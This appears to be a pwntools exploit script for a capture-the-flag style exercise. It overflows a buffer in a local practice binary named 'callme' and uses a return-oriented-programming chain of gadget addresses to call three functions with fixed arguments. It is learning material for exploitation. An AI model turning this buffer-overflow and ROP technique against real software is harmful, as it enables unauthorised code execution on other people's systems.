from pwn import *

context.arch = 'amd64'
prog = process("./callme")

# 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
pop_0 = p64(0x000000000040093c)
# function argument 1
arg_0 = p64(0xdeadbeefdeadbeef)
# function argument 2
arg_1 = p64(0xcafebabecafebabe)
# function argument 3
arg_2 = p64(0xd00df00dd00df00d)
# callme_one()
func_callme_one = p64(0x0000000000400720)
# callme_two()
func_callme_two = p64(0x0000000000400740)
# callme_three()
func_callme_three = p64(0x00000000004006f0)

payload = b'a' * 40
# pop rdi, rsi, rdx
payload += pop_0
payload += arg_0
payload += arg_1
payload += arg_2

# call callme_one()
payload += func_callme_one

# pop rdi, rsi, rdx
payload += pop_0
payload += arg_0
payload += arg_1
payload += arg_2

# call callme_two()
payload += func_callme_two

# pop rdi, rsi, rdx
payload += pop_0
payload += arg_0
payload += arg_1
payload += arg_2

# call callme_three()
payload += func_callme_three

print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
